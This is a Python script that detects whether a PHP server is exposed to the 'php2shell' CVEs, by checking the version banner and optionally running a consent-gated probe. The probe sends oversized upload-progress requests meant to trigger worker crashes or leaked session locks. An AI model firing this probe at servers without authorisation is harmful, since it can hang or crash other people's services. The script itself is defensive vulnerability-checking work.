#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
detect_remote.py -- remote detector for CVE-2026-109618 / CVE-2026-109619 ("php2shell")

Two detection layers, both derived from the vendor fix commit 506e87fa7
("Avoid state corruption via bailout") and the published GHSAs:

  1) banner / version sniff (default, read-only, safe everywhere):
     parses X-Powered-By / Server header PHP version and compares with the
     fixed-release map (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12).

  2) behavior probe (CONSENT-GATED, opt-in only):
     a bounded multipart POST with PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS +
     N files with long filenames (the exact minimal shape the vendor's own
     tests/basic/oom_rfc1867_upload_progress.phpt uses), retried up to
     --attempts times; then a same-SID GET. This exercises the leaked-lock /
     stale-state chain the fix closes. Verdict logic is conservative: only a
     genuine response-timeout from the follow-up counts as "blocked" --
     client-side errors never contribute to an UNPATCHED call.

Note on realism: the hang only becomes client-observable when the leaked
lock is held by a worker other than the one answering the follow-up
(prefork/mod_php pools, FPM pools with >1 children). On single-worker
targets (php -S) the chain self-heals; expect INDETERMINATE there, and fall
back to php2shell_detect.php running on the host for a definitive answer.

NEVER run mode 2 against targets you do not own or lack written permission
to test. Default output stays harmless; consent gate is --i-own-this-target.
"""
import argparse, http.client, socket, ssl, sys, time
from urllib.parse import urlparse

FIXED = {'8.2': '8.2.35', '8.3': '8.3.36', '8.4': '8.4.27', '8.5': '8.5.12'}

def ver_tuple(v):
    out = []
    for p in v.split('.'):
        n = ''
        for c in p:
            if c.isdigit(): n += c
            else: break
        out.append(int(n) if n else 0)
    return tuple(out)

def version_verdict(phpver):
    parts = ver_tuple(phpver)
    if not parts: return 'UNKNOWN'
    branch = '{}.{}'.format(parts[0], parts[1])
    if branch in FIXED:
        return ('PATCHED-LIKELY' if parts >= ver_tuple(FIXED[branch]) else
                'VULNERABLE-VERSION ({} < {})'.format(phpver, FIXED[branch]))
    if parts[0] == 8 and parts[1] >= 6:
        return 'PATCHED-LIKELY (8.6+ contains the fix)'
    if parts < (5, 0): return 'UNKNOWN'
    if parts[0] < 8:
        return 'EOL/VULNERABLE-VERSION ({}) - no official fix branch'.format(phpver)
    return 'UNKNOWN'

def req(u, method, path='/', body=None, headers=None, timeout=20):
    p = urlparse(u)
    host = p.hostname
    port = p.port or (443 if p.scheme == 'https' else 80)
    cx = (http.client.HTTPSConnection(host, port,
                                      context=ssl._create_unverified_context(),
                                      timeout=timeout)
          if p.scheme == 'https' else
          http.client.HTTPConnection(host, port, timeout=timeout))
    if path and not path.startswith('/'):
        path = '/' + path
    cx.request(method, path or '/', body, headers or {})
    r = cx.getresponse()
    data = r.read()
    cx.close()
    return r.status, dict((k.lower(), v) for k, v in r.getheaders()), data

def sniffer(url):
    st, hdr, _ = req(url, 'GET')
    powered = hdr.get('x-powered-by', '')
    server  = hdr.get('server', '')
    print('[banner] HTTP {} Server={!r} X-Powered-By={!r}'.format(st, server, powered))
    phpver = verdict = None
    for source, tag in ((powered, 'X-Powered-By'), (server, 'Server')):
        if 'PHP' in source:
            phpver = source.split('PHP/', 1)[-1].split(' ')[0]
            verdict = version_verdict(phpver)
            print('[banner] PHP {} (from {}) -> {}'.format(phpver, tag, verdict))
            break
    else:
        print('[banner] PHP not version-advertised; use php2shell_detect.php on-host')
    return phpver, verdict

def mpart(sid, cn, nfiles, fname_len):
    def part(name, val):
        return b'--BND\r\nContent-Disposition: form-data; name="%b"\r\n\r\n%b\r\n' % (
            name.encode(), val.encode())
    def fl(i):
        return ('--BND\r\nContent-Disposition: form-data; name="f%d"; filename="%s"\r\n\r\n'
                % (i, 'A' * fname_len)).encode('latin-1') + b'x\r\n'
    out = part(cn, sid) + part('PHP_SESSION_UPLOAD_PROGRESS', 'probe')
    for i in range(nfiles):
        out += fl(i)
    return out + b'--BND--\r\n'

def behavior_probe(args):
    """Staged evidence, never fabricates a verdict from client bugs."""
    sid = 'pocqr_%d' % int(time.time())
    body = mpart(sid, args.cookie_name, args.nfiles, args.fname_len)
    print('[behavior] SID=%s files=%dx%d bytes (body %dB)'
          % (sid, args.nfiles, args.fname_len, len(body)))

    oom_status = None
    for attempt in range(1, args.attempts + 1):
        t0 = time.time()
        try:
            st, _, _ = req(args.url, 'POST', '/', body, {
                'Content-Type': 'multipart/form-data; boundary=BND',
                'Content-Length': str(len(body)),
                'Cookie': '%s=%s' % (args.cookie_name, sid)}, timeout=args.timeout)
            print('[behavior] poison attempt %d -> HTTP %d in %.1fs'
                  % (attempt, st, time.time() - t0))
            oom_status = 'HTTP-%d' % st
            if st in (500, 502, 503):
                break
        except (http.client.RemoteDisconnected, http.client.IncompleteRead,
                ConnectionResetError, BrokenPipeError, socket.timeout,
                http.client.TimeoutError) as e:
            print('[behavior] poison attempt %d -> timeout/reset (%s) after %.1fs'
                  % (attempt, type(e).__name__, time.time() - t0))
            oom_status = 'forced-crash'
        except Exception as e:
            print('[behavior] poison attempt %d -> CLIENT-ERROR %s (aborting)'
                  % (attempt, type(e).__name__))
            return None

    time.sleep(1.5)
    t0 = time.time()
    followup = None
    try:
        st2, _, _ = req(args.url, 'GET', '/', None,
                        {'Cookie': '%s=%s' % (args.cookie_name, sid)},
                        timeout=args.followup_timeout)
        followup = 'HTTP-%d' % st2
        print('[behavior] follow-up -> HTTP %d in %.1fs' % (st2, time.time() - t0))
    except (http.client.TimeoutError, socket.timeout) as e:
        followup = 'BLOCKED(%s)' % type(e).__name__
        print('[behavior] follow-up -> TIMEOUT after %.1fs' % (time.time() - t0))
    except (http.client.RemoteDisconnected, ConnectionResetError, BrokenPipeError,
            http.client.IncompleteRead) as e:
        followup = 'RESET(%s)' % type(e).__name__
        print('[behavior] follow-up -> reset (%s)' % type(e).__name__)
    except Exception as e:
        followup = 'CLIENT-ERROR(%s)' % type(e).__name__
        print('[behavior] follow-up -> CLIENT-ERROR: %s' % type(e).__name__)

    return {'oom_status': oom_status, 'followup': followup, 'sid': sid}

def verdict(v1, beh):
    if beh and beh['followup'].startswith('BLOCKED('):
        return 'UNPATCHED (behavior: same-SID follow-up timed out -> leaked worker lock)'
    if v1 and 'VULNERABLE' in v1:
        return v1 + '; behavior inconclusive (see README verdict matrix)'
    if v1 and 'PATCHED-LIKELY' in v1:
        return v1 + ' (banner >= fixed series)'
    return 'UNKNOWN'

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('url', help='http(s)://host[:port] of the target PHP endpoint')
    ap.add_argument('--i-own-this-target', action='store_true',
                    help='authorise the intrusive behavior probe (you own this target)')
    ap.add_argument('--cookie-name', default='PHPSESSID')
    ap.add_argument('--nfiles', type=int, default=20)
    ap.add_argument('--fname-len', type=int, default=262144)
    ap.add_argument('--attempts', type=int, default=2)
    ap.add_argument('--timeout', type=int, default=30)
    ap.add_argument('--followup-timeout', type=int, default=15)
    args = ap.parse_args()

    phpver, v1 = sniffer(args.url)
    beh = behavior_probe(args) if args.i_own_this_target else None
    if not args.i_own_this_target:
        print('[behavior] skipped (pass --i-own-this-target to enable)')

    print('\n========== VERDICT ==========')
    print('banner:   PHP %s -> %s' % (phpver or 'unidentified', v1 or 'UNKNOWN'))
    if beh:
        print('behavior: oom_status=%s followup=%s sid=%s'
              % (beh['oom_status'], beh['followup'], beh['sid']))
    print('overall:  %s' % verdict(v1, beh))
    print()
    print('fixed releases: 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12')
    print('interim: session.upload_progress.enabled=0; fatal_error_backtraces=0 (8.5);')
    print('         do NOT use RLIMIT_AS/RLIMIT_DATA to emulate limits.')
    print('definitive check: run php2shell_detect.php on the host itself.')

if __name__ == '__main__':
    main()
